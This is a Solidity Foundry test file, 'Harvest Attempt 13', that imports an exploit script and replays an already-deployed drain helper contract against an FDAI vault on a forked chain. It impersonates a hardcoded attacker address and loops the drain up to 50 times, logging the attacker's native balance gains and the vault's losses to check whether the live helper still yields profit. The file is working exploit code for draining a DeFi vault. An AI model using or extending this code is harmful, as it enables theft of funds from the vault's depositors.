// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/Run.s.sol";

/// @title Harvest Attempt 13
/// @notice Replays the currently live CurrentFDAIDrain helper on the exact current fork head.
/// @dev Hypothesis: the already-deployed stage5 helper may still have profitable continuation value
///      that a fresh helper loses on this head.
contract Attempt13 is Test, HarvestConfig {
    address payable internal constant ATTACKER = payable(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);
    HarvestDrainMulti internal constant LIVE_HELPER =
        HarvestDrainMulti(payable(0x1B5F7bCC1F05331eFB914f7Cf06c5B405Be7cf88));

    function setUp() public {
        vm.createSelectFork("ch2");
    }

    function test_probe_existing_current_fdai_helper() public {
        uint256 maxRepeats = vm.envOr("HARVEST_TEST_MAX_REPEATS", uint256(50));

        uint256 snapshot = vm.snapshotState();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 vaultBefore = FDAI_VAULT.underlyingBalanceWithInvestment();
        uint256 ppfsBefore = FDAI_VAULT.getPricePerFullShare();

        console.log("EXISTING_HELPER:", address(LIVE_HELPER));
        console.log("EXISTING_NATIVE_BEFORE:", nativeBefore);
        console.log("EXISTING_VAULT_BEFORE:", vaultBefore);
        console.log("EXISTING_PPFS_BEFORE:", ppfsBefore);
        console.log("EXISTING_MAX_REPEATS:", maxRepeats);

        uint256 successfulRepeats;
        for (uint256 repeatIndex; repeatIndex < maxRepeats; ++repeatIndex) {
            uint256 previousNative = ATTACKER.balance;
            uint256 previousVault = FDAI_VAULT.underlyingBalanceWithInvestment();
            uint256 previousPpfs = FDAI_VAULT.getPricePerFullShare();

            uint256 gasBefore = gasleft();
            vm.startPrank(ATTACKER);
            try LIVE_HELPER.execute(1) {
                vm.stopPrank();
            } catch (bytes memory reason) {
                vm.stopPrank();
                console.log("EXISTING_REVERT_AT:", repeatIndex + 1);
                console.log("EXISTING_REVERT_REASON:", _decodeRevert(reason));
                break;
            }
            uint256 gasUsed = gasBefore - gasleft();

            uint256 currentNative = ATTACKER.balance;
            uint256 currentVault = FDAI_VAULT.underlyingBalanceWithInvestment();
            uint256 currentPpfs = FDAI_VAULT.getPricePerFullShare();
            uint256 nativeDelta = currentNative - previousNative;
            uint256 vaultDelta = previousVault - currentVault;

            console.log("EXISTING_REPEAT_INDEX:", repeatIndex + 1);
            console.log("EXISTING_REPEAT_GAS:", gasUsed);
            console.log("EXISTING_REPEAT_NATIVE_DELTA:", nativeDelta);
            console.log("EXISTING_REPEAT_VAULT_DELTA:", vaultDelta);
            console.log("EXISTING_REPEAT_PPFS_BEFORE:", previousPpfs);
            console.log("EXISTING_REPEAT_PPFS_AFTER:", currentPpfs);

            if (currentNative <= previousNative || currentVault >= previousVault) {
                console.log("EXISTING_STOP_AT:", repeatIndex + 1);
                break;
            }

            successfulRepeats = repeatIndex + 1;
        }

        console.log("EXISTING_SUCCESSFUL_REPEATS:", successfulRepeats);
        console.log("EXISTING_NATIVE_AFTER:", ATTACKER.balance);
        console.log("EXISTING_NATIVE_DELTA_TOTAL:", ATTACKER.balance - nativeBefore);
        console.log("EXISTING_VAULT_AFTER:", FDAI_VAULT.underlyingBalanceWithInvestment());
        console.log("EXISTING_VAULT_DELTA_TOTAL:", vaultBefore - FDAI_VAULT.underlyingBalanceWithInvestment());
        console.log("EXISTING_PPFS_AFTER:", FDAI_VAULT.getPricePerFullShare());

        bool reverted = vm.revertToState(snapshot);
        require(reverted, "snapshot restore failed");
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "empty revert data";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == bytes4(keccak256("Error(string)"))) {
            bytes memory payload = new bytes(revertData.length - 4);
            for (uint256 i; i < payload.length; ++i) {
                payload[i] = revertData[i + 4];
            }
            return abi.decode(payload, (string));
        }

        if (selector == bytes4(keccak256("Panic(uint256)"))) {
            return "panic(uint256)";
        }

        return "non-standard revert";
    }
}
